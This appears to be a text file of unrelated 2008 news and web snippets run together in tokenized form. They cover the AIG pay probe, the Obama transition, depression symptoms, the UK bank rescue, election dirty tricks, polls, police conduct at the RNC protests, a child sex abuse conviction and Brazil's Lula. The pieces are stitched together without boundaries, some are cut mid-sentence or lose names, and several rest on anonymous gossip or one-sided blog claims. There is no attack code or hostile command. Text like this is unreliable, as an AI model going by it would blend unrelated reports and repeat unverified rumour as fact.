Asked whether his office was investigating other firms ’ executive compensation , Cuomo said “ Yes ” but added , “ I ca n’t say at this time ” which companies .
He spoke on a telephone conference call with reporters .
AIG will provide a full accounting of executive compensation and help recover payments that Cuomo contends violated state law , according to a joint statement from the attorney general ’s office and AIG , issued after Cuomo met with AIG ’s new chief executive , Edward Liddy , on Thursday .
Those payments include “ all forms of compensation paid to former CEO Martin Sullivan and the former head of the ( AIG ) Financial Products Unit , Joseph Cassano , ” the statement said .
Cuomo had objected to “ extravagant ” payments to executives who ran the company into near - collapse , including a $ 5 million cash bonus and $ 15 million “ golden parachute ” to Sullivan earlier this year , as well as a $ 34 million bonus for Cassano , whose unit generated the bulk of AIG ’s losses .

Mr. Podesta has been mapping out the transition so systematically that he has already written a draft Inaugural Address for Mr. Obama , which he published this summer in a book called “ The Power of Progress . ”
The speech calls for rebuilding a “ grand alliance ” with the rest of the world , bringing troops home from Iraq , recommitting to the war in Afghanistan , cutting poverty in half in 10 years and reducing greenhouse gases 80 percent by 2050 .
The Obama team has four groups , which in turn are divided into roughly a dozen subgroups , according to Democrats informed about the effort .
At first , they said , there were three main groups  for personnel , executive actions and legislative strategy  but the team recently added a fourth reflecting the imperatives of the economic crisis and known as lame duck .
As he sets about trying to build a team , Mr. Obama has several possibilities for White House chief of staff , most notably Mr. Daschle , his close adviser , although that could be complicated because Mr. Daschle ’s wife is a lobbyist .
Other possibilities mentioned by Democrats include Representative Rahm Emanuel of Illinois , former Commerce Secretary William M. Daley and Mr. Obama ’s Senate chief of staff , Pete Rouse .
Mr. Podesta , who held the job under President Bill Clinton , could also be recruited for another tour of duty .
Besides Mr. Gates , some Obama advisers favor keeping Dr. James B. Peake , the veterans affairs secretary .
But Treasury Secretary Henry M. Paulson Jr. has made clear to colleagues that he has no desire to stay on no matter who wins , and neither nominee is inclined to ask him , associates say .
Instead , Obama advisers are weighing a short - term appointment of an elder statesman to get through the current crisis and help instill confidence in global markets .
The names being mentioned include the former Federal Reserve chief Paul A. Volcker and former Treasury Secretaries Robert E. Rubin and Lawrence H. Summers .
But one senior adviser said it would be important to send a message of change at a time of economic crisis .
“ You can expect a fresh face instead of a recycled face ” at the Treasury , the adviser said .
He said that would include the boyish - looking Mr. Geithner , 47 , who worked at the Treasury under Mr. Clinton and his Republican predecessors and has generally gotten high marks for his role in shaping the government response to the current crisis .
To run his transition effort , Mr. McCain tapped Mr. Lehman , the former Navy secretary who served on the commission that investigated the Sept. 11 attacks .
Two other advisers , William E. Timmons , a Washington lobbyist , and William Ball , another former Navy secretary , are assisting .
Like other 9/11 commissioners , Mr. Lehman has expressed strong concern over slow transitions that leave a new administration short - handed to deal with an early crisis .
But Mr. McCain has been leery about being too forward - leaning .
Many Republicans who would normally be consulted about plans and personnel said they had detected little preparation  perhaps , they said , out of a sense that it would only be an exercise in “ going through the motions , ” as one put it .
Many people wonder how to help depression and whether depression is a disease that can be treated .
Depression is one of the most common mental diseases of our time and according to the World Health Organization , affects millions of people in the world .
When talking about how to deal with depressionwe should always have in mind that depression is a disease that can be treated , and it can be treated successfully when treated early .
Do I have depression ?
Everyone will feel at some point in their life the symptoms of depression .
It is normal .
If you have noticed , however , that some of the following symptoms appear for two or three weeks or more , you should visit a psychologist or psychiatrist , to assess if you are suffering from depression and give you help on how to overcome depression .
Change in mood
A change in your mood is an early sign that you may suffer from depression .
The symptoms that may lead to changes in the mood are : sadness , disappointment , desperate , crying very easily and irritation .
Furthermore you will notice that you are worried , stressed , but many times do not know why .
You start being upset with small things that you did not notice in the past .
You are not happy , and you do not enjoy your hobbies and activities that used to please you .
Nothing can please you and you feel that your life is full of failures .
Changes in the physical well - being
Troubles with sleep , wake up frequently at night or very early in the morning or have excessive sleepiness during the day .
The appetite and your weight have dropped ( sometimes for some people these symptoms are the opposite : appetite and weight are increased ) .
You have headaches and nausea , dizziness ; you feel pain in the feet and hands .
You have no desire for sexual relations .
When you get up in the morning , you feel tired and you do not get any rest from sleep .
You are nervous and you get tired very easily .
Activities that you performed in the past very easily , now they seem like a mountain to you .
Many times you do not even have the will to get out of the bed .
Changes in thinking
Everything seems vain .
You are constantly overcome by feelings of guilt , you start blaming yourself for everything it is happening , you feel that you do not deserve anything , you feel alone , helpless , trapped in dead ends .
The future scares you , seems bleak and threatening .
You are having troubles to concentrate and you cannot recall information that you recently accepted .
You are only considering the unpleasant and negative aspects of things and you exaggerate them .
Changes in daily life
You do not wish to interact with people that once pleased you .
You do not have the mood to talk or make conversations .
All resemble boring , tedious and meaningless .
You stay at home and you do not care about your personal hygiene or your appearance .
Depression : the modern malady
A series of life events seem to increase the risk for depression .
For example : the death of a beloved person , a divorce , job loss , immigration and economic recession .
Also , some people interpret the world around them based on some assumptions that are not real or correct and this results in an ultimately negative image about themselves and anything around them .
The risk of getting depressed when you have close relatives suffering , especially from serious or chronic diseases , is increased .
Some non-psychiatric disorders have been found that can cause Depression .
These act on the central nervous system and affect the operation of those regions of the brain that regulate emotion .
Such disorders are Parkinson ’s disease , Multiple Sclerosis , the stroke , endocrine disorders , AIDS , systemic disorders such as anaemia and metastatic cancer , and also various medicines , such as cortisone and alcohol .
How to help depression
No treatment can claim exclusivity for helping depression .
What is needed is a combination therapy according to the needs of the patient that is decided by the therapist to be the more effective .
Besides that , the goals of each type of therapy are different .
The physical treatments such as pharmacotherapy , aimed more at improving physiological functions such as sleep , appetite , etc. , while psychotherapy aims to improve the interpersonal functionality and better functioning of the individual .
The therapist chooses for each patient the appropriate treatment and psychotherapy composition .
The aim is to help depression and make the patient feel confident about their self .
Psychotherapy has different forms and types .
In general these types are categorized into short term and long - term therapies .
The most effective forms of psychotherapy than can help depression are individual psychotherapy and interpersonal psychotherapy .
Individual Psychotherapy
The individual psychotherapy is the most widespread psychotherapeutically approach to Depression , where there is an emphasis on past experiences of the patient and aims in identifying unconsciously motivated behaviour .
This method helps depression indirectly by improving interpersonal relationships ; trust in other people , defence mechanisms , emotional sensitivity , creativity , productivity , etc .
The improvement of all these is possible through thorough analysis and interpretation of significant problems and conflicts during the patient ’s childhood .
The individual psychotherapy is a long - term treatment and appropriate in cases where the person ’s life is disturbed by unconscious conflict .
Interpersonal Psychotherapy
Interpersonal Psychotherapy focuses more in the present problems of the patient , is completed in 12 - 16 sessions that are held once per week .
It aims in the alleviation of symptoms , seeking to solve the problems that derive from the interpersonal relations , family life and work environment .
The therapist informs the patience for the problems identified and educates him on how he / she will improve his / her skills in the interpersonal communication .
Interpersonal psychotherapy is effective and can help many forms of depression .
Creative Treatments via Art , Art Therapy , Music therapy , Dance therapy
This type of treatment can be applied alone or they can be combined with other psychological treatments as well as with medical treatment .
Through the symbolism and the transport of a problem in an artistic form ( narration , fairy tale , dance , drama , improvisation , musical pieces , drawing ) , the individual is encouraged to examine the problem from the safety of aesthetic distance , to develop sentimentality and become creative again , giving an existential meaning in the life and his action .
Video : Brown and Darling announce the bail - out Agencies
The Bank of England today slashed UK interest rates by half a point to 4.5 % in its first emergency rate cut since the aftermath of the 9/11 terrorist attacks , just hours after the British government announced a momentous £ 500 bn rescue of Britain 's banking sector .
The shock move from the Bank of England came at midday as the world 's central banks acted together to cut the cost of borrowing in an attempt to avoid financial meltdown , with rate cuts in America , the eurozone , Canada , Sweden and Switzerland .
Gordon Brown told parliament that the global rate cuts were an important signal that the world can act together to address the financial crisis .
Just hours earlier , the prime minister had taken the momentous decision to part - nationalise Britain 's banks .
The Bank of England said that it was acting because the outlook for economic activity in the United Kingdom has " deteriorated substantially , reflecting a sharp monetary contraction " .
It had been due to announce its decision on rates tomorrow .
Shares in London fluctuated wildly today , with the FTSE 100 index plunging by as much as 360 points , or 7.8 % , in early trading before rallying after the rate cuts .
But the moves by the government and the Bank of England appeared not to be enough to restore confidence .
The FTSE 100 closed down almost 5.2 % , dropping 238.5 points , to 4366.7 .
Trading was just as dizzying on Wall Street , where the Dow Jones Industrial Average was trading 223 points lower at 9223 at 5.30 pm .
UK government ministers and bank officials thrashed out the details of the banking rescue plan into the early hours of the morning .
The £ 500 bn rescue scheme comes in three parts :
• £ 50bn of taxpayers ' money will be offered to banks to rebuild their capital reserves
• £ 200bn of liquidity is being made available as short - term loans in an attempt to thaw the frozen interbank lending markets .
This is twice as much as was previouly offered under the Special Liquidity Scheme
• A further £ 250bn will underwrite lending between banks - another attempt to shore up their balance sheets .
The £ 50bn part - nationalisation section of the scheme is equivalent to £ 2,000 for every taxpayer in the UK , and analysts warned today that the public will " foot the bill " for the plan .
The Treasury said that seven banks and one building society will take part - Abbey , Barclays , HBOS , HSBC , Lloyds TSB , Nationwide Building Society , Royal Bank of Scotland and Standard Chartered .
Barclays and RBS have already said they will participate in the scheme , but HSBC has insisted that it has no plans to do so .
Gordon Brown said that the package was a " bold and far - reaching solution " to the crisis and would help every family and business in the country .
" This is not a time for conventional thinking or outdated dogma but for fresh and innovative intervention that gets to the heart of the problem , " he said .
Brown also claimed that taxpayers would be protected and would earn " a proper return " .
But Jeremy Batstone - Carr , an analyst at Charles Stanley , said that " ultimately government borrowing will increase and ultimately we , the taxpayer , will foot the bill " .
He also suggested that £ 50 bn may not be enough to rescue the banking system .
An end to fat - cat pay ?
The complex scheme announced this morning suggests that the government has insisted on a crackdown on the pay packages of top banking executives in return for rescuing them .
" In reaching agreement on capital investment the government will need to take into account dividend policies and executive compensation practices and will require a full commitment to support lending to small businesses and homebuyers , " said the Treasury .
According to Darling , the plan will " unbung " the banking sector .
" It is a process that inevitably will take time .
It is not an instant change but it is a restructuring , it is stabilising the system , and that is very important , " the chancellor said .
Asked why the government had not come up with the package earlier , he said that the discussion had been going on for several weeks and had been very complex .
He said he was " rather irritated by the speculation started on Sunday , " adding : " I wanted to announce it when the time was right , when we had got everything sorted out , we had a scheme that worked and the big banks were signed up to it . "
Liquidity injection
The government will use £ 50 bn to buy preference shares in the banks , which take precedence over ordinary shares during a liquidation , but do not give the holders any voting rights .
The £ 200bn of lending announced today comes through the Special Liquidity Scheme , which allows banks to get short - term funding from the Bank of England by swapping long - term bonds for short - term UK Treasury Bills .
Separately , the government will provide guarantees to the banking system of up to £ 250 bn to encourage banks to lend to each other and end the paralysis in the interbank lending markets .
The Treasury stressed though that it will charge normal commercial fees for these guarantees .
The plan comes after a succession of tumultuous days on the stockmarket .
Yesterday Royal Bank of Scotland shares slumped by 39 % and HBOS lost 40 % .
It was reported this morning that the RBS chief executive , Sir Fred Goodwin , and the chairman , Sir Tom McKillop , are stepping down , but there was no official announcement from the bank and sources have denied the story .
RBS and Barclays are thought to need £ 15 bn each in fresh capital , with Lloyds TSB requiring £ 12bn - assuming its takeover of HBOS goes through .
Shares in HBOS surged by 60 % today but fell back to close up 24.5 % at 117 p .
Royal Bank of Scotland was trading 22 % in early trade but closed pretty much flat at 90.7 p .

BILL and Hillary Clinton are doing their bare minimum to help elect Barack Obamapresident because the Democratic nominee refused to guarantee Hillary a US Supreme Court judgeship should he win the White House , sources say .
A rep for Sen. Clinton e-mailed Page Six yesterday : “ Absurd .
Nonsense .
Rubbish .
Hogwash .
Malarkey . ”
But the word in Democratic circles is that Hillary – after being rejected by Obama as his running mate , the position given to Sen .
Joe Biden – made it clear to Obama ’s camp that she wanted to be appointed to the Supreme Court .
One insider said , “ Hillary wants an assurance that if she shows loyalty and goes out there like a good soldier , she will be rewarded with a nomination for the Supreme Court should a seat become available . ”
It is expected there will be at least one vacancy on the high court during the next presidential term , what with Justice John Paul Stevens turning 89 in April and Ruth Bader Ginsburg celebrating her 76th birthday in March .
The problem is , we ’re told , Obama “ balked ” at promising Hillary the judgeship , perhaps because he still resents how the Clintons attacked him during the primaries .
While the Clintons have been campaigning for Obama , their support is tepid at best , his supporters complain .
Since the nomination , Bill has repeatedly called Obama ’s Republican rival , Sen. John McCain , a “ good man ” and a “ friend ” and told reporters he understands why McCain ’s vice - presidential pick , Sarah Palin , “ is hot out there . ”
On Sept. 22 , the ex-president did such a bad job of stumping for Obama on David Letterman ‘s show that guest Chris Rock , who came on after him , remarked , “ Boy , is it me or [ Clinton ] did n’t want to say the name Barack Obama ? ”
' Tis the Season of Election Dirty Tricks : Scaring Student Voters Flyers warn that undercover police will be at the polls on Election Day .
Oct. 6 , 2008  --
Election officials and watchdog groups are bracing for the wave of sneaky or suspicious phone calls , leaflets and emails that typically hit battleground states in the final 30 days of the presidential campaign .
Young voters at Drexel University in Philadelphia , Penn .
have already been targeted , with students reporting that flyers have been posted around campus warning that undercover police will be at the polls on Election Day looking to make arrests .
The flyer reads like a friendly letter to fellow students relaying a warning from an " Obama supporter " :
" He informed me that on the day of the election there will be undercover officers to execute warrants on those who come to vote based on the anticipated turnout , " writes the anonymous student in the letter which was later posted on the Drexel College Democrats website .
" He advised me if I had any outstanding warrants or traffic offenses I should clear them up prior to voting . "
Political experts say the Drexel flyer is a classic example of voter suppression – a practice that involves scaring , angering , or confusing voters so that they stay at home on Election Day .
" The basic idea is that you intimidate people by saying that law enforcement is using the polling place to catch scofflaws … criminals … whoever .
It 's basically a deterrent to keep people away from voting , " said Allen Raymond , a former Republican operative who went to prison for three - months in 2006 for his involvement in a scheme to jam the phones at headquarters of the Democratic get - out - the vote effort in New Hampshire in 2002 .
Raymond says that such tactics have evolved from some of the more overt voter intimidation schemes seen back in the early 1980s when the GOP 's " Ballot Security Task Force " used armed off - duty police officers at the polling places in New Jersey and posted signs reading " voter fraud is a felony . "
Other underhanded tactics seek to confuse voters about their voter registration .
In 2006 , voters in Virginia reportedly received fake voicemail messages from the state elections commission claiming that the voters were registered in another state and could be criminally charged if they cast their vote in Virginia .
" It does n't take much to discourage people from voting , " said Dr. Larry Sabato , political analyst and director of the University of Virginia 's Center for Politics .
" Generally when people see that , they think ' I just do n't want to take a risk .
I 've got enough problems in my life , I think I 'll just skip this one . "
Raymond and Sabato say voters should be on the look out for a number of other time - honored tricks , including :
- " Push - poll " phone calls using the guise of a survey to push negative information about a candidate .
- Leaflets or emails listing the wrong date or a " rain date " for the election .
- Automated voicemail messages telling voters that the location of their polling place has changed .
- Repeated late night automated " robo- calls " with a message from a candidate .
Raymond says that some of the dirtiest – and most effective – tricks are designed to trigger a " latent bigoted reaction . "
Perhaps the most notorious example was the smear against Senator John McCain in South Carolina before the state 's presidential primary in 2000 .
Anonymous opponents used push - polls and flyers to spread a whisper campaign suggesting that McCain 's Bangladeshi - born adopted daughter was his illegitimate black child .
In his book , " How to Rig an Election : Confessions of a Republican Operative " , Raymond describes how he helped devise other subtle tricks playing on voters ' prejudices during the 2000 congressional race in New Jersey .
One trick involved phone calls to Democratic voters of Eastern European descent using the voice of an " angry black man , " while another used taped phone messages to Democratic union households using actors with thick Hispanic accents .
The ultimate goal of both efforts was to make the voters " throw up their hands " and stay away from the polls .
Such schemes may be harder to pull off today now that federal laws require campaigns and parties to identify themselves to callers , but political experts say that in the age of the Internet the dirty trickster has an almost infinite ability to carry out their schemes with easy and anonymity .
" It 's easy , it 's untraceable , and by the time you find anything about it , the election is over , " said Sabato .

and Megan Thee
The McCain campaign ’s recent angry tone and sharply personal attacks on Sen. Barack Obama appear to have backfired and tarnished Sen .
John McCain more than their intended target , the latest New York Times / CBS News poll has found .
After several weeks in which the McCain campaign unleashed a series of strong political attacks on Obama , trying to tie him to a former 1960s radical , among other things , the poll found that more voters see McCain as waging a negative campaign than Obama .
Six in 10 voters surveyed said that McCain had spent more time attacking Obama than explaining what he would do as president ; by about the same number , voters said Obama was spending more of his time explaining than attacking .
Overall , the poll found that if the election were held today , 53 percent of those determined to be probable voters said that they would vote for Obama and 39 percent said they would vote for McCain .
Other polling
As well , a Los Angeles Times / Bloomberg poll released Tuesday also found Obama has broadened his lead over McCain and strengthened his hold on key groups .
Obama leads McCain , 50 percent to 41 percent , among likely voters in the poll .
In September , Obama had a 49 percent to 45 percent lead .
In the weeks between the two polls , the nation ’s economy teetered toward collapse , and the poll demonstrated the shattering effect of that upheaval on the nation ’s voters .
Only 10 percent now say they feel the country is heading in the right direction — the lowest figure since the poll began asking the question in 1991 .
Eighty - four percent said the country is on the wrong track .
Nearly seven in 10 cited the economy as the most important issue for the presidential candidates to solve — the figure was four in 10 in September — and Obama was the clear beneficiary .
Voters saw him as more trustworthy than McCain on the economy and better able to handle a financial crisis .
Independent voters
The Los Angeles Times / Bloomberg poll also found that Obama improved sharply over the past month among independent voters .
McCain carried them by a 15 - percentage - point margin in September ; in this poll , Obama led among that group by 5 percentage points .
More men moved toward Obama , too .
He maintained his lead among female voters .
The findings of the polls come as the race enters its final three weeks , with the two candidates scheduled to hold their third and final debate tonight , and as separate polls in critical swing states that could decide the election giving Obama a growing edge .
But wide gaps in polls have historically tended to narrow in the closing weeks of the race as the election nears .
Voters who said that their opinions of Obama had changed recently were twice as likely to say that they had gotten better as to say they had gotten worse .
Voters who said that their views of McCain had changed were three times more likely to say that they had gotten worse than to say they had improved .
The top reasons cited by those who said they thought less of McCain were his recent attacks and his choice of Gov. Sarah Palin of Alaska as his running mate .
( The vast majority said that their opinions of Obama , the Democratic nominee , and McCain , the Republican nominee , had remained unchanged in recent weeks . )
But in recent days , McCain and Palin have scaled back their attacks on Obama .
The New York Times poll found that Obama now is supported by majorities of men and independents , two groups that he has been fighting to win over .
The poll also found , for the first time , that white voters are just about evenly divided between McCain and Obama , who is seeking to become the first black president .
McCain was viewed unfavorably by 41 percent of voters , and favorably by 36 percent .
Palin ’s favorability rating is now 32 percent , down 8 points from last month , and her unfavorable rating climbed nine percentage points to 41 percent .
Obama ’s favorability rating , by contrast , is now at 50 percent , the highest recorded for him thus far by the New York Times and CBS News .
McCain ’s strength
There were still some strong findings for McCain .
Sixty - four percent of voters polled said that McCain , 72 , was well - prepared for the presidency , which has been a central theme of his campaign .
Fifty - one percent said that Obama , 47 , was .

The margin of sampling error for both polls was three percentage points in either direction .

In a most disturbing twist of events , it has been reported that not only were journalists and news photographers detained and / or arrested , and preemptive arrests were performed , but it is now being reported that the brutality of the St. Paul police , under the direction of the Department of Homeland Security , was extended to medics on the scene , as well as local residents .
We ’ll start as a young protester describes his own torture at the hands of the police , a telling which is too reminiscent of the handling of detainees at Guantanamo Bay .
The following is from FireDoglake , and I strongly urge you to read the entire story .
It is beyond belief that this could and did happen in The United States of America .
From a fourth - year University of Minnesota medical student :
While much attention has been paid to arrests of prominent journalists & protesters harsh treatment during arrests , in the streets of St Paul many community members feel invisible as they live out the RNC protest repercussions .
Undocumented families , refugees have been staying away from their homes in highly patrolled areas near downtown St Paul in fear of encountering police by accident .
I visited and documented a gentleman of color who had no prior criminal history , who was detained without cause near central St Paul .
During his arrest , while handcuffed he was beat by a police officer .
The victim had recently had major surgery , released from hospital less than a week prior .
Later , during booking , the same officer punched him repeatedly in the head and neck in front of other officers who looked on without concern .
When police realized that this man was severely injured , they drove him one block away from the hospital and let him limp his way to the ER .
People of color , those most marginalized in our community , have faced severe consequences because of RNC protests .
Police riled up , frustrated with protesters are taking out their anger on those without large wallets , or skin privilege .
There are more stories of abuse of people and abuse of power below the fold .
This was reported by Michael Cavlan , a Registered Nurse at Regions Hospital in St. Paul :
I hear “ we need a medic over here ” so we responded .
Apparently , the police had maced a member of the “ Minnesota Peace Team . ”
These were all people marked in bright green vests , who were working with the police to contain violence .
The two that were maced , full in the face were both 70 year old men .
For the record , the peace teams had been very successful in de-escalating violence .
I ran over and treated one and my buddy treated the other one .
While I was doing so , someone from the crowd ran over and said “ buddy , get out of here , I heard the cops say ‘ get the medic in blue . ' ”
I hightailed out of there , ditching my blue scrubs .
Ironically , as I did so a young man has a seizure , fell and hit his head hard right in front of me .
I was still a medic , just unmarked now .
I and others treated him until an ambulance arrived and took him to the hospital .
Again , for the record we were now getting reports that the police were specifically targeting journalists and medics all over .
( snip )
One young man had apparently just returned from serving in Iraq .
I treated him after the police maced him , full in the eyes .
He had been simply walking by , going somewhere .
As I treated him one of the National Lawyer ’s Guild lawyers came by , took his information and a picture .
At this time , the wall of police opened up , a commander of some sort pointed at myself and the lawyer , took a picture of us .
I thought , “ oh sh*t ” and myself , my son and the lawyer started to walk away .
Then a group of about fifteen bike cops came after us , surrounded me and pushed my son aside .
Sean went to get the lawyer to help and they apparently threatened to tase him .
Thank God , I did not know this at this time .
They detained me , searched me and questioned me .
Then they let me go .
I took my son home and went home to bed .
And there is this most disturbing report from the Portland Street Medics :
A group of 350 people were being detained and preparing to be arrested on a bridge .
The group included some legal observers from the NLG and 12 Street Medics .
Medic Dispatch received news that the legal observers in the group had been released prior to the arrest , so the six medics headed out to see if they could negotiate with the police for the release of the medics . [ snip ]
Upon arrival at the scene one of the Portland Medics spoke with an officer and received a phone number for “ Watch Command ” to begin negotiations .
On the first phone call , the medic explained the job of the medics and explained that they were asking for the release of the medics detained on the bridge .
The medic gave WC their full legal name and offered to provide proof of credentials as an EMT .
WC offered to give the request to the commander at the scene and then call the medics back .
After a reasonable amount of time , the medic called WC back to check on the status .
WC questioned the location of the medics , and the medic confirmed that they were at the scene of the arrest before ending the phone call to wait for further news .
The medic attempted to speak with two officers on scene , but neither would produce a supervisor to do the negotiations .
Moments after the second attempt , while the Medic Liaison was making another call to WC , one of the Portland Medics was pulled out of the crowd of observers and drug into the street by four police officers .
The medic ’s pockets were searched while the medic stated , “ I do not consent to this search . ”
While still searching this medic , the commanding officer led four more officers into the crowd and pulled out the Medic Liaison , who had been on the phone moments before .
The first medic was released back into the crowd after their pockets were searched .
The second medic was questioned as to why they were carrying a backpack and hip pack .
The medic explained their status as an EMT and allowed officers to take their registration card as proof .
Officers explained , “ You reached your hands in your pockets , and that makes us nervous , so now we have to check what you ’re up to . ”
The medic repeatedly denied consent for the search but officers began opening the medic kits regardless .
An officer asked , “ Where did you get all this stuff ?
Did you steal it off the ambulance ? ”
The medic responded , “ I ’m not going to answer any more of your questions until I speak to my lawyer . ”
The officer replied , “ In that case , you can pick your own shit up off the ground , ” and began opening ziplock bags and dumping medical supplies on the ground .
During the search , officers repeatedly made threats about possible criminal charges against the medic , including “ medical terrorism . ”
Officers dumped the entire contents of both medical kits on the ground , purposefully stepped on the equipment , read all the aftercare flyers and made threats about “ testing the pepper spray ” on this medic , and searched the medic ’s body and clothing three separate times in an extremely rough and inappropriate manner .
After running the medic ’s ID through the system , the officers ordered to medic to clean up all the supplies , and accused the medic of littering when a small packet of vitamins was overlooked on the ground .
Once the supplies were repacked , the medic was free to go .
These police actions were not based on any reasonable suspicion of wrongdoing .
The police were targeting the medics who were attempting to liaise with commanding officers and harassing them in order to reduce their power and prevent further negotiating tactics .
These are only a few stories from the many reported at FireDogLake .
Please read the rest as well as the more than two dozen links at the bottom of their story .
It is frightening what is becoming of this country .
Journalists , especially photo journalists , were targeted because during the 2004 Republican National Convention , the independent news media group , I - Witness , took footage of the protests and arrests ( a precursor to the events in St. Paul ) , which , when shown in court , proved that the police had doctored film used as evidence , allowing defendants to win tens of millions of dollars in lawsuits .
First [ they ] came for the terrorists , but I was not a terrorist , so I did not speak out .
Then they came for the enemy combatants , but I was not a combatant , so I did not object .
Then they came for the protesters resisting “ free speech zones ” near … campaign rallies , but I was not a protester and so I only voiced my unease .
Contact your elected officials and let them know that this is completely unacceptable .
Beit your Congressperson , Senator , or other local officials , we all must let the government know that we , as citizen ’s of this great country , will not allow this abuse to take place against other citizens .
This can not be allowed to continue .
UPDATE : Here is the video of the arrest of the man in the original video above .

Kelly Lumadue Convicted of Sex with 5 - Year - Old
, a 33 - year - old woman who was videotaped by her husband having sex with a 5 - year - old boy , has been sentenced to life in prison without the possibility of parole .
Lumadue , who was 21 when she had sex with the child , said she performed those acts under duress by her husband ( now deceased ) , a professional photographer who recorded the sessions .
The Florida woman was living in Longwood with her husband at the time , and was arrested seven years later , in 2003 , when a garbage collector found the tapes and turned them over to authorities .
The child , who 's relationship with Lumadue has not been identified , reportedly has no recollection of the sex acts .
A jury originally convicted Lumadue in 2007 after watching the video tapes , only to have the judge overturn the ruling .
His reason ?
The boy , now a teenager , was not a witness at her trial .
He does not remember what happened .
That is significant , wrote Circuit Judge Clayton Simmons , who presided over her trial , then ordered a new one .
“ The fact that the defendant faces a Draconian punishment for a crime where the victim is alive and apparently living a normal life some eleven years after the criminal act , when criminals who have killed people are released from prison almost daily , makes it even more imperative that the defendant receive a fair and impartial trial . . . ” he wrote .
Hmmm , not only did Lumadue admit in court that she performed the sex acts , but the jurors saw the tapes !
Are you kidding me with this ?
Buoyed by a robust economy and his ability to work with leaders across the ideological spectrum , Brazilian President Luiz Inacio Lula da Silva has emerged as the chief power broker and mediator in South America .
Lula ’s rise has paralleled the decline of U.S. influence in its “ backyard , ” analysts say , a result in part of Washington ’s plummeting global prestige and the Bush administration ’s unremitting focus on the Middle East .
A moderate with an unassailable leftist background , Lula has become the point man for healing regional crises such as the current turmoil in Bolivia and the recent escalation of tensions among Colombia , Venezuela and Ecuador .
Lula , who survived overlapping corruption scandals , exudes the persona of a level - headed leader who eschews ideology for solutions .
The can - do image and the country ’s economic prosperity have helped win him soaring popularity at home and abroad .
Advertisement
“ Lula is the ultimate pragmatist , ” said former Finance Minister Delfim Netto , an advisor .
The president seems intent on fulfilling Brazil ’s long - unrealized economic and political potential and making it a recognized world power , starting by asserting its role as South America ’s preeminent presence .
Lula ’s skills as a mediator probably will be tested as the region enters a renewed period of uncertainty : the prospect of civil war in Bolivia , a shaky leftist government headed by an ex-bishop in Paraguay , Venezuela ’s emerging alliances with Russia and Iran , and a new U.S. president to be elected in the midst of a financial crisis that probably will continue sending ripples through the hemisphere .
Lula , who began a second term in 2007 , has increasingly asserted his influence as he and Venezuelan President Hugo Chavez vie for the hearts and minds of contemporary Latin Americans .
Venezuela ’s arms deals and foreign alliances have played a role in Brazil ’s decision to bolster its military , analysts say .

“ Since the beginning of his second term , Lula began to compete vigorously to counter Chavez ’s aspirations as a regional leader , ” noted Julio Burdman , an Argentine political analyst .
But Lula ’s aims transcend any competition with Chavez , whose nation is much smaller than Brazil .
Lula has loftier goals , even pushing for a permanent seat for Brazil on the U.N. Security Council , however unlikely .
Whether he ’s sloughing off Chavez ’s strident anti-Americanism or privatizing roads and power plants in Brazil , the former union firebrand who emerged from the assembly lines of Sao Paulo has repeatedly defied stereotypes since taking office in 2003 as the avatar of a new generation of leftist leaders .
He has gone from being what some considered a radical bent on imposing socialism to a free - market champion who still funds social programs for the poor .
Lula enjoys a warm relationship with President Bush and was a guest last year at Camp David .
But he ’s no U.S. patsy , challenging Washington on economic and security issues when he sees Brazil ’s interests at stake
Advertisement
On Tuesday , Lula assailed Bush ’s farewell address to the U.N. General Assembly last month for downplaying the U.S. financial meltdown .
“ I thought he would make a goodbye speech that talked a little about the economic crisis , ” Lula , appearing disappointed , told reporters in New York .
“ He took the option of talking about terrorism again . ”
Lula also has gone toe - to - toe with U.S. trade negotiators as informal leader of the “ Group of 20 " developing nations , blocking trade deals that incorporate U.S. and European farm subsidies that the group says are unfair .
But for U.S. policymakers , Lula is a welcome counter - weight to Chavez ’s yanqui - bashing bluster .
Last month in Santiago , Chile , Lula trumped Chavez at an emergency summit of South American leaders seeking to calm widening conflict in Bolivia , which shares a long border with Brazil .

The Brazilian president insisted that the group ’s final declaration omit anti-Washington invective -- to the dismay of Chavez and Bolivian President Evo Morales , both of whom have expelled U.S. ambassadors for alleged coup - mongering .
Many analysts conclude that the days of Washington calling the shots are gone -- collateral damage , in part , from the attacks of Sept. 11 .
“ That ’s when the U.S. clearly began focusing its attention on the Middle East , Afghanistan and Iraq , and many sensed the loss of engagement with the region , ” said Peter De Shazo , a former deputy assistant secretary of State for the Western Hemisphere now at the Center for Strategic and International Studies in Washington .
In Venezuela , Chavez survived a short - lived 2002 coup that he blamed on Washington , and returned with renewed anti-U.S. fervor .
Chavez lured allies with petrodollars and Cold War-era oratory as the Bush administration went to war in Iraq .
Advertisement
“ Part of the problem for the United States is the tremendous antagonism with Venezuela , which makes a U.S. role very problematic , ” noted Michael Shifter of the Inter - American Dialogue , a Washington think tank .
“ But it ’s also much deeper .
It reflects the fact that Brazil and other countries in the region want greater independence from the United States and want to resolve problems on their own . ”
Although Chavez has won wide popular appeal among the region ’s young and disenfranchised -- and Venezuela ’s oil wealth has bought allies -- his divisive discourse has also alienated many .
With Chavez , Lula dances a delicate tango :
He maintains cordial relations with his oil - rich neighbor , a major client for Brazilian goods and services , while sidestepping the Venezuelan ’s incendiary rhetoric .
Still , Lula shares the United States ’ wariness about Chavez ’s burgeoning arms deals and Venezuela ’s planned military exercises with Russia , noted Amaury de Souza , a political analyst here .

Lula has ordered a strategic review of Brazil ’s military that could result in massive rearming .
Brazil is also considering a purchase of jet fighters from U.S. , French and Swedish bidders and a nuclear submarine deal with France .
At home , Lula ’s popularity -- an opinion poll out last week put his approval rating at 68 % -- has little to do with submarines and foreign policy .
It ’s all about the galloping economy .
Brazil , a vast , fertile nation that is among the world leaders in exports of soybeans , beef , iron and coffee , is shedding the vestiges of its Third World image .
It has scored big in the worldwide commodity boom , spurred by voracious Asian demand .
International investment is pouring in .
In a nation notorious for its unequal distribution of wealth , Lula has managed the difficult challenge of pleasing both the affluent and the impoverished multitudes .
While the rich are getting richer and the middle class is expanding rapidly , Lula has dedicated massive social spending to the less fortunate .
Advertisement
“ Lula has been lucky :
He has had big oil finds at home and economic conditions around the world have been favorable for Brazil , ” said Aldo Musacchio , a Brazil specialist at Harvard Business School .
“ The current [ U.S. ] economic crisis may be a big worry , but in Brazil incomes are growing and people do n’t think the situation is bad at all . ”

Kraul reported from Sao Paulo and McDonnell from Buenos Aires and Santa Cruz , Bolivia .
Special correspondents Mery Mogollon in Caracas , Venezuela , Marcelo Soares in Sao Paulo and Andres D’Alessandro in Buenos Aires contributed to this report .
It looks like Elite XC , the upstart mixed martial arts organization featuring Kimbo Slice , is down for the count .
